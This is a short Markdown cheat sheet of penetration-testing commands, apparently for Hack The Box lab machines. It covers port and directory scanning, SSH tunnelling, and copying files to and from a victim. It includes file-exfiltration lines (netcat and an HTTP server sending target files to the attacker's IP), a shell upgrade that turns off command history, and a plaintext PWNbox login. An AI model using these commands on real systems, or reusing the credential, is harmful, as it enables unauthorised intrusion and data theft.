# PWNbox ssh
```
htb-ac-1444035@htb-pmuseptgcc.htb-cloud.com
y2BDp1p8 
```
# Nmap

```
nmap -sVC --min-rate 1500 -p- -Pn 10.10.11.68
```

# Setup Host

```
echo "10.10.11.68 planning.htb" | sudo tee -a /etc/hosts
```
# Recon 
### Quét thư mục và các file có đuôi php, bak, zip
```
gobuster dir -u http://[TARGET_IP] -w /usr/share/wordlists/dirb/common.txt -x php,bak,zip,txt -t 50
```
# Tunnel

```
ssh -L 3000:127.0.0.1:3000 axel@cat.htb
```

# Leak File từ Target

```
#target 
python3 -m http.server 8000 --bind 0.0.0.0

# local
wget http://TARGET:8000/filename -O filename
curl -O http://TARGET:8000/filename
```

```
nc 10.10.14.7 5555 < web_20250806_120723.zip.aes 
nc -lvnp 5555 > web_20250806_120723.zip.aes -> your machine
```

# Copy file Kali to Victim
`scp npbackup.conf marco@10.10.11.82:/tmp/npbackup.conf`


# Beautify CLi


```
script -qc /bin/bash /dev/null

python3 -c 'import pty,os; pty.spawn("/bin/bash")'
export TERM=xterm export SHELL=bash export HISTFILE=/dev/null
```
